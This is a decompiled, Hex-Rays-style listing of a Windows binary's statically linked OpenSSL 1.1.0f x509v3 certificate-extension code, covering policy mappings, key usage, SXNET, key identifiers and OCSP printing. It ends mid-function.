int *__fastcall sub_1400C1E00(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v4; // r15
  int v6; // edi
  __int64 v7; // rax
  _QWORD *v8; // rbx
  char *v9; // rcx
  char **v10; // rbp
  char **v11; // rax
  __int64 v12; // rsi
  _QWORD *v13; // rax

  v4 = (int *)sub_1400296C0();
  if ( v4 )
  {
    v6 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v4;
    }
    else
    {
      while ( 1 )
      {
        v7 = sub_140029880((__int64)a3, v6);
        v8 = (_QWORD *)v7;
        if ( !*(_QWORD *)(v7 + 16) )
          break;
        v9 = *(char **)(v7 + 8);
        if ( !v9 )
          break;
        v10 = sub_14002C840(v9, 0);
        v11 = sub_14002C840((char *)v8[2], 0);
        v12 = (__int64)v11;
        if ( !v10 || !v11 )
        {
          sub_140024610(34, 145, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pmaps.c", 90);
          sub_140023A40(6, "section:", *v8, ",name:", v8[1], ",value:", v8[2]);
          goto LABEL_15;
        }
        v13 = (_QWORD *)sub_140050B70((__int64)&unk_140123AE0);
        if ( !v13 )
        {
          sub_140024610(34, 145, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pmaps.c", 96);
          goto LABEL_15;
        }
        *v13 = v10;
        v13[1] = v12;
        sub_1400297C0(v4, (__int64)v13);
        if ( ++v6 >= (int)sub_1400296E0(a3) )
          return v4;
      }
      sub_140024610(34, 145, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pmaps.c", 82);
      sub_140023A40(6, "section:", *v8, ",name:", v8[1], ",value:", v8[2]);
      v10 = 0i64;
      v12 = 0i64;
LABEL_15:
      sub_14003F4D0((__int64)v10);
      sub_14003F4D0(v12);
      sub_140029720(v4, (void (*)(void))sub_1400C20E0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 145, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pmaps.c", 74);
    return 0i64;
  }
}

//----- (00000001400C2010) ----------------------------------------------------
int *__fastcall sub_1400C2010(__int64 a1, unsigned int *a2, int *a3)
{
  int i; // edi
  __int64 *v5; // rbx
  int *v7; // [rsp+20h] [rbp-C8h] BYREF
  char v8[80]; // [rsp+30h] [rbp-B8h] BYREF
  char v9[80]; // [rsp+80h] [rbp-68h] BYREF

  v7 = a3;
  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v5 = (__int64 *)sub_140029880((__int64)a2, i);
    sub_14003FE60(v9, 80, *v5);
    sub_14003FE60(v8, 80, v5[1]);
    sub_1400B8300(v9, v8, &v7);
  }
  return v7;
}

//----- (00000001400C20E0) ----------------------------------------------------
void __fastcall sub_1400C20E0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140123AE0);
}

//----- (00000001400C2100) ----------------------------------------------------
int *__fastcall sub_1400C2100(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v5; // rbp
  int v7; // edi
  __int64 v8; // rax
  __int64 v9; // rbx
  _QWORD *v10; // r14
  unsigned __int8 *v11; // rcx
  __int64 v12; // r10
  unsigned __int8 *v13; // rdx
  __int64 v14; // r9
  int v15; // eax
  int v16; // r8d
  __int64 v17; // r8
  int v18; // eax
  int v19; // edx

  v5 = sub_14004FDA0();
  if ( v5 )
  {
    v7 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v5;
    }
    else
    {
      while ( 1 )
      {
        v8 = sub_140029880((__int64)a3, v7);
        v9 = *(_QWORD *)(a1 + 96);
        v10 = (_QWORD *)v8;
        v11 = *(unsigned __int8 **)(v9 + 8);
        if ( v11 )
        {
          v12 = *(_QWORD *)(v8 + 8);
          while ( 1 )
          {
            v13 = *(unsigned __int8 **)(v9 + 16);
            v14 = v12 - (_QWORD)v13;
            do
            {
              v15 = v13[v14];
              v16 = *v13 - v15;
              if ( v16 )
                break;
              ++v13;
            }
            while ( v15 );
            if ( !v16 )
              break;
            v17 = v12 - (_QWORD)v11;
            do
            {
              v18 = v11[v17];
              v19 = *v11 - v18;
              if ( v19 )
                break;
              ++v11;
            }
            while ( v18 );
            if ( !v19 )
              break;
            v11 = *(unsigned __int8 **)(v9 + 32);
            v9 += 24i64;
            if ( !v11 )
              goto LABEL_17;
          }
          if ( !(unsigned int)sub_140082780(v5, *(_DWORD *)v9, 1) )
          {
            sub_140024610(34, 101, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_bitst.c", 77);
            sub_14004FD70((__int64)v5);
            return 0i64;
          }
        }
LABEL_17:
        if ( !*(_QWORD *)(v9 + 8) )
          break;
        if ( ++v7 >= (int)sub_1400296E0(a3) )
          return v5;
      }
      sub_140024610(34, 101, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_bitst.c", 86);
      sub_140023A40(6, "section:", *v10, ",name:", v10[1], ",value:", v10[2]);
      sub_14004FD70((__int64)v5);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 101, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_bitst.c", 67);
    return 0i64;
  }
}

//----- (00000001400C22D0) ----------------------------------------------------
int *__fastcall sub_1400C22D0(__int64 a1, __int64 a2, int *a3)
{
  __int64 v3; // rbx
  int *v6; // [rsp+40h] [rbp+18h] BYREF

  v6 = a3;
  v3 = *(_QWORD *)(a1 + 96);
  if ( !*(_QWORD *)(v3 + 8) )
    return a3;
  do
  {
    if ( sub_140082730(a2, *(_DWORD *)v3) )
      sub_1400B8300(*(_BYTE **)(v3 + 8), 0i64, &v6);
    v3 += 24i64;
  }
  while ( *(_QWORD *)(v3 + 8) );
  return v6;
}

//----- (00000001400C2340) ----------------------------------------------------
void *sub_1400C2340()
{
  return &unk_140123FA8;
}

//----- (00000001400C2350) ----------------------------------------------------
int *__fastcall sub_1400C2350(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v4; // rbp
  int v6; // ebx
  __int64 v7; // rax
  _QWORD *v8; // rdi
  char *v9; // rcx
  char **v10; // rax

  v4 = (int *)sub_1400296C0();
  if ( v4 )
  {
    v6 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v4;
    }
    else
    {
      while ( 1 )
      {
        v7 = sub_140029880((__int64)a3, v6);
        v8 = (_QWORD *)v7;
        v9 = *(char **)(v7 + 16);
        if ( !v9 )
          v9 = *(char **)(v7 + 8);
        v10 = sub_14002C840(v9, 0);
        if ( !v10 )
          break;
        sub_1400297C0(v4, (__int64)v10);
        if ( ++v6 >= (int)sub_1400296E0(a3) )
          return v4;
      }
      sub_140029720(v4, (void (*)(void))sub_14003F4D0);
      sub_140024610(34, 103, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_extku.c", 93);
      sub_140023A40(6, "section:", *v8, ",name:", v8[1], ",value:", v8[2]);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 103, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_extku.c", 80);
    return 0i64;
  }
}

//----- (00000001400C2480) ----------------------------------------------------
int *__fastcall sub_1400C2480(__int64 a1, unsigned int *a2, int *a3)
{
  int i; // ebx
  __int64 v5; // rax
  int *v7; // [rsp+20h] [rbp-78h] BYREF
  char v8[80]; // [rsp+30h] [rbp-68h] BYREF

  v7 = a3;
  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v5 = sub_140029880((__int64)a2, i);
    sub_14003FE60(v8, 80, v5);
    sub_1400B8300(0i64, v8, &v7);
  }
  return v7;
}

//----- (00000001400C2530) ----------------------------------------------------
__int64 __fastcall sub_1400C2530(__int64 a1, __int64 *a2, __int64 a3, unsigned int a4)
{
  sub_14002A590(a3, "%*s", a4, byte_1400D7DAE);
  if ( *a2 )
  {
    sub_14002A430(a3, (__int64)"Not Before: ", 0xCu);
    sub_1400BD5B0(a3, *a2);
    if ( !a2[1] )
      return 1i64;
    sub_14002A430(a3, (__int64)", ", 2u);
  }
  if ( a2[1] )
  {
    sub_14002A430(a3, (__int64)"Not After: ", 0xBu);
    sub_1400BD5B0(a3, a2[1]);
  }
  return 1i64;
}

//----- (00000001400C25E0) ----------------------------------------------------
void *sub_1400C25E0()
{
  return &unk_1401240D0;
}

//----- (00000001400C25F0) ----------------------------------------------------
void *sub_1400C25F0()
{
  return &unk_140124260;
}

//----- (00000001400C2600) ----------------------------------------------------
void *sub_1400C2600()
{
  return &unk_1401241F0;
}

//----- (00000001400C2610) ----------------------------------------------------
__int64 __fastcall sub_1400C2610(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  int i; // esi
  __int64 *v8; // rdi
  _WORD *v9; // rbx
  int v11; // [rsp+20h] [rbp-28h]
  int v12; // [rsp+28h] [rbp-20h]

  v12 = sub_14007D9A0(*(int **)a2);
  v11 = v12 + 1;
  sub_14002A590(a3, "%*sVersion: %ld (0x%lX)", a4, byte_1400D7DAE, v11, v12);
  for ( i = 0; i < (int)sub_1400296E0(*(unsigned int **)(a2 + 8)); ++i )
  {
    v8 = (__int64 *)sub_140029880(*(_QWORD *)(a2 + 8), i);
    v9 = sub_1400B8E70(0i64, *v8);
    sub_14002A590(a3, "\n%*sZone: %s, User: ", a4, byte_1400D7DAE, v9);
    sub_14001D930(v9);
    sub_1400BC980(a3, v8[1]);
  }
  return 1i64;
}

//----- (00000001400C2700) ----------------------------------------------------
__int64 __fastcall sub_1400C2700(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 v3; // rbx
  __int64 v5; // rax
  _BYTE *v6; // rsi
  _DWORD *v7; // rax
  __int64 v9; // [rsp+58h] [rbp+20h] BYREF

  v3 = 0i64;
  v9 = 0i64;
  if ( (int)sub_1400296E0(a3) <= 0 )
    return v3;
  while ( 1 )
  {
    v5 = sub_140029880((__int64)a3, v3);
    v6 = *(_BYTE **)(v5 + 16);
    v7 = sub_1400B92B0(0i64, *(char **)(v5 + 8));
    if ( !v7 )
      break;
    if ( !(unsigned int)sub_1400C27C0(&v9, (__int64)v7, v6, -1) )
      return 0i64;
    LODWORD(v3) = v3 + 1;
    if ( (int)v3 >= (int)sub_1400296E0(a3) )
      return v9;
  }
  sub_140024610(34, 125, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_sxnet.c", 109);
  return 0i64;
}

//----- (00000001400C27C0) ----------------------------------------------------
__int64 __fastcall sub_1400C27C0(__int64 *a1, __int64 a2, _BYTE *a3, int a4)
{
  unsigned int *v4; // r14
  int v5; // ebx
  unsigned int v9; // ebx
  _BYTE *i; // rax
  __int64 v12; // rdi
  __int64 *v13; // rax
  __int64 v14; // rax

  v4 = 0i64;
  v5 = a4;
  if ( a1 && a2 && a3 )
  {
    if ( a4 == -1 )
    {
      v9 = 0;
      for ( i = a3; *i; ++v9 )
      {
        if ( v9 >= 0x80000000 )
          break;
        ++i;
      }
      v5 = v9 & 0x7FFFFFFF;
    }
    if ( v5 > 64 )
    {
      sub_140024610(34, 126, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_sxnet.c", 150);
      return 0i64;
    }
    v12 = *a1;
    if ( !*a1 )
    {
      v13 = (__int64 *)sub_140050B70((__int64)&unk_140124260);
      v12 = (__int64)v13;
      if ( !v13 || !(unsigned int)sub_14007DA60(*v13, 0) )
        goto LABEL_22;
      *a1 = v12;
    }
    if ( sub_1400C29C0(v12, a2) )
    {
      sub_140024610(34, 126, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_sxnet.c", 162);
      return 0i64;
    }
    v14 = sub_140050B70((__int64)&unk_1401241F0);
    v4 = (unsigned int *)v14;
    if ( v14
      && (unsigned int)sub_14006B0A0(*(_QWORD *)(v14 + 8), a3, v5)
      && (unsigned int)sub_1400297C0(*(int **)(v12 + 8), (__int64)v4) )
    {
      *(_QWORD *)v4 = a2;
      return 1i64;
    }
LABEL_22:
    sub_140024610(34, 126, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_sxnet.c", 179);
    sub_140051250(v4, (__int64)&unk_1401241F0);
    sub_140051250((unsigned int *)v12, (__int64)&unk_140124260);
    *a1 = 0i64;
    return 0i64;
  }
  sub_140024610(34, 126, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_sxnet.c", 144);
  return 0i64;
}
// 1400C28F0: conditional instruction was optimized away because ebx.4 is in (<41u|<-1)

//----- (00000001400C29C0) ----------------------------------------------------
__int64 __fastcall sub_1400C29C0(__int64 a1, __int64 a2)
{
  int v4; // ebx
  __int64 *v5; // rsi

  v4 = 0;
  if ( (int)sub_1400296E0(*(unsigned int **)(a1 + 8)) <= 0 )
    return 0i64;
  while ( 1 )
  {
    v5 = (__int64 *)sub_140029880(*(_QWORD *)(a1 + 8), v4);
    if ( !sub_14007D950(*v5, a2) )
      break;
    if ( ++v4 >= (int)sub_1400296E0(*(unsigned int **)(a1 + 8)) )
      return 0i64;
  }
  return v5[1];
}

//----- (00000001400C2A40) ----------------------------------------------------
_BYTE *__fastcall sub_1400C2A40(__int64 a1, const void **a2)
{
  _BYTE *v3; // rax
  _BYTE *v4; // rdi

  if ( !a2 || !*(_DWORD *)a2 )
    return 0i64;
  v3 = sub_14001D8E0(*(_DWORD *)a2 + 1);
  v4 = v3;
  if ( v3 )
  {
    memmove(v3, a2[1], *(int *)a2);
    v4[*(int *)a2] = 0;
    return v4;
  }
  else
  {
    sub_140024610(34, 149, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_ia5.c", 35);
    return 0i64;
  }
}

//----- (00000001400C2AE0) ----------------------------------------------------
_DWORD *__fastcall sub_1400C2AE0(__int64 a1, __int64 a2, _BYTE *a3)
{
  int v3; // eax
  _DWORD *v6; // rbx
  unsigned int v7; // r8d
  _BYTE *i; // rax

  if ( a3 )
  {
    v6 = sub_14004FE30();
    if ( v6 )
    {
      v7 = 0;
      for ( i = a3; *i; ++v7 )
      {
        if ( v7 >= 0x80000000 )
          break;
        ++i;
      }
      if ( (unsigned int)sub_1400475D0((__int64)v6, a3, v7 & 0x7FFFFFFF) )
      {
        return v6;
      }
      else
      {
        sub_14004FD70((__int64)v6);
        return 0i64;
      }
    }
    else
    {
      sub_140024610(34, 100, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_ia5.c", 63);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v3 - 14, v3 + 52, v3 + 59, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_ia5.c", 49);
    return 0i64;
  }
}
// 1400C2B09: variable 'v3' is possibly undefined

//----- (00000001400C2BB0) ----------------------------------------------------
_DWORD *__fastcall sub_1400C2BB0(__int64 a1, __int64 a2, char *a3)
{
  __int64 v4; // rdx
  char v5; // al
  _DWORD *result; // rax
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rcx
  int *v10; // rax
  int v11; // [rsp+20h] [rbp-78h]
  int v12; // [rsp+30h] [rbp-68h] BYREF
  int v13; // [rsp+34h] [rbp-64h] BYREF
  __int64 v14; // [rsp+38h] [rbp-60h] BYREF
  char v15[64]; // [rsp+40h] [rbp-58h] BYREF

  v4 = 0i64;
  do
  {
    v5 = a3[v4++];
    if ( v5 != aHash[v4 - 1] )
      return sub_1400C2D70(a1, a2, a3);
  }
  while ( v4 != 5 );
  result = sub_14004FEE0();
  v7 = (__int64)result;
  if ( !result )
  {
    sub_140024610(34, 115, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_skey.c", 69);
    return 0i64;
  }
  if ( !a2 )
    goto LABEL_21;
  if ( *(_DWORD *)a2 == 1 )
    return result;
  v8 = *(_QWORD *)(a2 + 24);
  if ( v8 )
  {
    v9 = *(_QWORD *)(v8 + 32);
    goto LABEL_15;
  }
  if ( !*(_QWORD *)(a2 + 16) )
  {
LABEL_21:
    v11 = 77;
LABEL_22:
    sub_140024610(34, 115, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_skey.c", v11);
    goto LABEL_23;
  }
  v9 = *(_QWORD *)(*(_QWORD *)(a2 + 16) + 80i64);
LABEL_15:
  if ( !v9 )
  {
    v11 = 87;
    goto LABEL_22;
  }
  sub_140067820(0i64, &v14, &v12, 0i64, v9);
  v10 = (int *)sub_14005BAC0();
  if ( !(unsigned int)sub_14006D970(v14, v12, (__int64)v15, &v13, v10, 0i64) )
  {
LABEL_23:
    sub_14004FD70(v7);
    return 0i64;
  }
  if ( !(unsigned int)sub_14006B0A0(v7, v15, v13) )
  {
    sub_140024610(34, 115, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_skey.c", 97);
    goto LABEL_23;
  }
  return (_DWORD *)v7;
}
// 1400C2C73: conditional instruction was optimized away because rax.8==0

//----- (00000001400C2D50) ----------------------------------------------------
_BYTE *__fastcall sub_1400C2D50(__int64 a1, __int64 a2)
{
  return sub_14003BC70(*(unsigned __int8 **)(a2 + 8), *(_DWORD *)a2);
}

//----- (00000001400C2D70) ----------------------------------------------------
_DWORD *__fastcall sub_1400C2D70(__int64 a1, __int64 a2, char *a3)
{
  _DWORD *v4; // rbx
  void *v6; // rax
  int v7; // [rsp+58h] [rbp+20h] BYREF

  v4 = sub_14004FEE0();
  if ( v4 )
  {
    v6 = sub_14003BE60(a3, &v7);
    *((_QWORD *)v4 + 1) = v6;
    if ( v6 )
    {
      *v4 = v7;
      return v4;
    }
    else
    {
      sub_14004FD70((__int64)v4);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 112, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_skey.c", 40);
    return 0i64;
  }
}

//----- (00000001400C2E00) ----------------------------------------------------
int *__fastcall sub_1400C2E00(__int64 a1, __int64 a2, int *a3)
{
  _BYTE *v4; // rbx
  unsigned int *v5; // rdx
  __int64 v6; // rcx
  _BYTE *v7; // rbx
  int *v9; // [rsp+40h] [rbp+18h] BYREF

  v9 = a3;
  if ( *(_QWORD *)a2 )
  {
    v4 = sub_14003BC70(*(unsigned __int8 **)(*(_QWORD *)a2 + 8i64), **(_DWORD **)a2);
    sub_1400B8300("keyid", v4, &v9);
    sub_14001D930(v4);
    a3 = v9;
  }
  v5 = *(unsigned int **)(a2 + 8);
  if ( v5 )
  {
    a3 = sub_1400BA5F0(0i64, v5, a3);
    v9 = a3;
  }
  v6 = *(_QWORD *)(a2 + 16);
  if ( !v6 )
    return a3;
  v7 = sub_14003BC70(*(unsigned __int8 **)(v6 + 8), *(_DWORD *)v6);
  sub_1400B8300("serial", v7, &v9);
  sub_14001D930(v7);
  return v9;
}

//----- (00000001400C2ED0) ----------------------------------------------------
__int64 __fastcall sub_1400C2ED0(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 v3; // rsi
  int *v4; // r13
  __int64 v5; // r15
  int v6; // ebp
  char v8; // r14
  char i; // di
  __int64 v10; // rbx
  __int64 v11; // rdx
  __int64 v12; // r8
  char v13; // cl
  __int64 v14; // rdx
  __int64 v15; // rcx
  char v16; // al
  __int64 v17; // rax
  char v18; // cl
  __int64 v19; // r8
  __int64 v20; // rcx
  int v21; // edx
  int v22; // edx
  _LocaleUpdate *v23; // rbx
  int v24; // eax
  __int64 v25; // rax
  unsigned int *v26; // rax
  unsigned int *v27; // rdi
  struct __crt_locale_pointers *LocaleT; // rax
  __int64 v29; // rax
  __int64 v30; // rbp
  _QWORD *v31; // rbx
  __int64 v32; // rax
  __int64 result; // rax

  v3 = 0i64;
  v4 = 0i64;
  v5 = 0i64;
  v6 = 0;
  v8 = 0;
  for ( i = 0; v6 < (int)sub_1400296E0(a3); ++v6 )
  {
    v10 = sub_140029880((__int64)a3, v6);
    v11 = 0i64;
    v12 = *(_QWORD *)(v10 + 8);
    while ( 1 )
    {
      v13 = *(_BYTE *)(v12 + v11++);
      if ( v13 != aKeyid[v11 - 1] )
        break;
      if ( v11 == 6 )
      {
        v14 = *(_QWORD *)(v10 + 16);
        v8 = 1;
        if ( v14 )
        {
          v15 = 0i64;
          while ( 1 )
          {
            v16 = *(_BYTE *)(v14 + v15++);
            if ( v16 != aAlways[v15 - 1] )
              break;
            if ( v15 == 7 )
            {
              v8 = 2;
              goto LABEL_19;
            }
          }
        }
        goto LABEL_19;
      }
    }
    v17 = 0i64;
    do
    {
      v18 = *(_BYTE *)(v12 + v17++);
      if ( v18 != aIssuer_0[v17 - 1] )
      {
        sub_140024610(34, 119, 120, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_akey.c", 94);
        sub_140023A40(2, "name=", *(_QWORD *)(v10 + 8));
        return 0i64;
      }
    }
    while ( v17 != 7 );
    v19 = *(_QWORD *)(v10 + 16);
    i = 1;
    if ( v19 )
    {
      v20 = 0i64;
      do
      {
        v21 = *(unsigned __int8 *)(v19 + v20++);
        v22 = v21 - (unsigned __int8)aAlways[v20 - 1];
      }
      while ( !v22 && v20 != 7 );
      i = 1;
      v4 = 0i64;
      if ( !v22 )
        i = 2;
    }
LABEL_19:
    ;
  }
  if ( !a2 )
  {
LABEL_48:
    sub_140024610(34, 119, 121, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_akey.c", 104);
    return 0i64;
  }
  v23 = *(_LocaleUpdate **)(a2 + 8);
  if ( !v23 )
  {
    if ( *(_DWORD *)a2 == 1 )
      return sub_1400A5530();
    goto LABEL_48;
  }
  if ( !v8 )
    goto LABEL_32;
  v24 = sub_1400AC960(*(_QWORD *)(a2 + 8), 0x52u, -1);
  if ( v24 >= 0 )
  {
    v25 = sub_1400AC940((__int64)v23, v24);
    if ( v25 )
      v3 = sub_1400BDB80(v25);
  }
  if ( v8 != 2 || v3 )
  {
LABEL_32:
    if ( i && !v3 || i == 2 )
    {
      v26 = (unsigned int *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(v23);
      v27 = (unsigned int *)sub_1400A4C60(v26);
      LocaleT = _LocaleUpdate::GetLocaleT(v23);
      v29 = sub_14006B080((__int64)LocaleT);
      v30 = v29;
      if ( !v27 || !v29 )
      {
        sub_140024610(34, 119, 122, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_akey.c", 126);
        goto LABEL_36;
      }
    }
    else
    {
      v27 = 0i64;
      v30 = 0i64;
    }
    v31 = (_QWORD *)sub_1400A5530();
    if ( v31 )
    {
      if ( v27 )
      {
        v4 = (int *)sub_1400296C0();
        if ( !v4 || (v32 = sub_1400A55F0(), (v5 = v32) == 0) || !(unsigned int)sub_1400297C0(v4, v32) )
        {
          sub_140024610(34, 119, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_akey.c", 138);
          goto LABEL_36;
        }
        *(_DWORD *)v5 = 4;
        *(_QWORD *)(v5 + 8) = v27;
      }
      v31[1] = v4;
      result = (__int64)v31;
      v31[2] = v30;
      *v31 = v3;
      return result;
    }
LABEL_36:
    sub_1400294B0((void **)v4);
    sub_1400A55D0((unsigned int *)v5);
    sub_1400A4C80(v27);
    sub_14004FD70(v30);
    sub_14004FD70(v3);
    return 0i64;
  }
  sub_140024610(34, 119, 123, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_akey.c", 116);
  return 0i64;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C3200) ----------------------------------------------------
_DWORD *__fastcall sub_1400C3200(__int64 a1, __int64 a2, char *a3)
{
  return sub_1400B92B0(a1, a3);
}

//----- (00000001400C3220) ----------------------------------------------------
_WORD *__fastcall sub_1400C3220(__int64 a1, int *a2)
{
  int v4; // eax
  __int64 v5; // rcx

  v4 = sub_14007D8B0(a2);
  v5 = *(_QWORD *)(a1 + 96);
  if ( !*(_QWORD *)(v5 + 8) )
    return sub_1400B8DF0(a1, (__int64)a2);
  while ( v4 != *(_DWORD *)v5 )
  {
    v5 += 24i64;
    if ( !*(_QWORD *)(v5 + 8) )
      return sub_1400B8DF0(a1, (__int64)a2);
  }
  return sub_14003BB60(*(_BYTE **)(v5 + 8));
}

//----- (00000001400C32A0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C32A0(__int64 a1, __int64 *a2, __int64 a3, unsigned int a4)
{
  return (!*a2
       || (int)sub_14002A590(a3, "%*scrlUrl: ", a4, byte_1400D7DAE) > 0
       && (unsigned int)sub_1400BC980(a3, *a2)
       && (int)sub_14002A430(a3, (__int64)"\n", 1u) > 0)
      && (!a2[1]
       || (int)sub_14002A590(a3, "%*scrlNum: ", a4, byte_1400D7DAE) > 0
       && (int)sub_140080A80(a3, a2[1]) > 0
       && (int)sub_14002A430(a3, (__int64)"\n", 1u) > 0)
      && (!a2[2]
       || (int)sub_14002A590(a3, "%*scrlTime: ", a4, byte_1400D7DAE) > 0
       && (unsigned int)sub_1400BD5B0(a3, a2[2])
       && (int)sub_14002A430(a3, (__int64)"\n", 1u) > 0);
}

//----- (00000001400C33E0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C33E0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  return (int)sub_14002A590(a3, "%*s", a4, byte_1400D7DAE) > 0 && (unsigned int)sub_1400BD5B0(a3, a2) != 0;
}

//----- (00000001400C3450) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C3450(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  return (int)sub_14002A590(a3, "%*s", a4, byte_1400D7DAE) > 0 && (int)sub_14003FD20(a3, a2) > 0;
}

//----- (00000001400C34C0) ----------------------------------------------------
_DWORD *sub_1400C34C0()
{
  return sub_14004FEE0();
}

//----- (00000001400C34E0) ----------------------------------------------------
__int64 __fastcall sub_1400C34E0(const void **a1, void **a2)
{
  if ( !a2 )
    return *(unsigned int *)a1;
  memmove(*a2, a1[1], *(int *)a1);
  *a2 = (char *)*a2 + *(int *)a1;
  return *(unsigned int *)a1;
}

//----- (00000001400C3530) ----------------------------------------------------
_DWORD *__fastcall sub_1400C3530(_QWORD *a1, _BYTE **a2, int a3)
{
  __int64 v3; // rbp
  _DWORD *v6; // rbx

  v3 = a3;
  if ( (a1 && (v6 = (_DWORD *)*a1) != 0i64 || (v6 = sub_14004FEE0()) != 0i64)
    && (unsigned int)sub_14006B0A0((__int64)v6, *a2, v3) )
  {
    *a2 += v3;
    if ( a1 )
      *a1 = v6;
    return v6;
  }
  else
  {
    if ( !a1 || (_DWORD *)*a1 != v6 )
      sub_14004FD70((__int64)v6);
    sub_140024610(39, 102, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ocsp\\v3_ocsp.c", 206);
    return 0i64;
  }
}

//----- (00000001400C35E0) ----------------------------------------------------
void __fastcall sub_1400C35E0(__int64 a1)
{
  sub_14004FD70(a1);
}

//----- (00000001400C3600) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C3600(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  return (int)sub_14002A590(a3, "%*s", a4, byte_1400D7DAE) > 0 && (int)sub_1400C6EC0(a3, a2) > 0;
}

//----- (00000001400C3670) ----------------------------------------------------
__int64 sub_1400C3670()
{
  return sub_14004FE90();
}

//----- (00000001400C3690) ----------------------------------------------------
__int64 __fastcall sub_1400C3690(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  int v7; // edi
  unsigned int v8; // ebp
  __int64 *v9; // rsi

  if ( (int)sub_14002A590(a3, "%*sIssuer: ", a4, byte_1400D7DAE) > 0
    && (int)sub_14005F0A0(a3, *(unsigned int ***)a2, 0, 8520479) > 0 )
  {
    v7 = 0;
    if ( (int)sub_1400296E0(*(unsigned int **)(a2 + 8)) <= 0 )
      return 1i64;
    v8 = 2 * a4;
    while ( 1 )
    {
      v9 = (__int64 *)sub_140029880(*(_QWORD *)(a2 + 8), v7);
      if ( (int)sub_14002A590(a3, "\n%*s", v8, byte_1400D7DAE) <= 0
        || (int)sub_14003FD20(a3, *v9) <= 0
        || (int)sub_14002A1A0(a3, (__int64)" - ") <= 0
        || (int)sub_1400BA900(a3, v9[1]) <= 0 )
      {
        break;
      }
      if ( ++v7 >= (int)sub_1400296E0(*(unsigned int **)(a2 + 8)) )
        return 1i64;
    }
  }
  return 0i64;
}

//----- (00000001400C37A0) ----------------------------------------------------
__int64 __fastcall sub_1400C37A0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v7; // rax
  __int64 v8; // rax

  sub_14002A590(a3, "%*sPath Length Constraint: ", a4, byte_1400D7DAE);
  if ( *(_QWORD *)a2 )
    sub_140080A80(a3, *(_QWORD *)a2);
  else
    sub_14002A590(a3, "infinite");
  sub_14002A1A0(a3, (__int64)"\n");
  sub_14002A590(a3, "%*sPolicy Language: ", a4, byte_1400D7DAE);
  sub_14003FD20(a3, **(_QWORD **)(a2 + 8));
  sub_14002A1A0(a3, (__int64)"\n");
  v7 = *(_QWORD *)(*(_QWORD *)(a2 + 8) + 8i64);
  if ( v7 )
  {
    v8 = *(_QWORD *)(v7 + 8);
    if ( v8 )
      sub_14002A590(a3, "%*sPolicy Text: %s\n", a4, byte_1400D7DAE, v8);
  }
  return 1i64;
}

//----- (00000001400C3890) ----------------------------------------------------
__int64 __fastcall sub_1400C3890(__int64 a1, __int64 a2, _BYTE *a3)
{
  int *v4; // r14
  int v5; // ebp
  _QWORD *v6; // rbx
  _BYTE *v7; // rdx
  int v8; // esi
  unsigned int *v9; // rdi
  int v10; // ebx
  _QWORD *v11; // rax
